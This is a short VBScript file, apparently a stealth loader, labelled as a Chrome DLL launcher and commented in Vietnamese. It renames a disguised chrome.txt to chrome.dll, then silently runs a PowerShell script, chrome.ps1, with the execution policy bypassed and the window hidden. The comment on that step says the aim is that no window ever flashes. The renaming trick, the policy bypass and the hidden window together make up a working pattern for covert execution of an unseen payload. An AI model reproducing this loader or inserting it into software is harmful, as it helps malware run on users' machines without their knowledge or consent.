' Chrome DLL Launcher for VBScript
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
currentDir = FSO.GetParentFolderName(WScript.ScriptFullName)
WshShell.CurrentDirectory = currentDir

' Bước 1: Đổi chrome.txt về chrome.dll nếu cần
If FSO.FileExists(currentDir & "\chrome.txt") And Not FSO.FileExists(currentDir & "\chrome.dll") Then
    FSO.MoveFile currentDir & "\chrome.txt", currentDir & "\chrome.dll"
End If

' Bước 2: Khởi chạy ngầm tuyệt đối không nháy cửa sổ
targetCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & currentDir & "\chrome.ps1"""
WshShell.Run targetCmd, 0, False
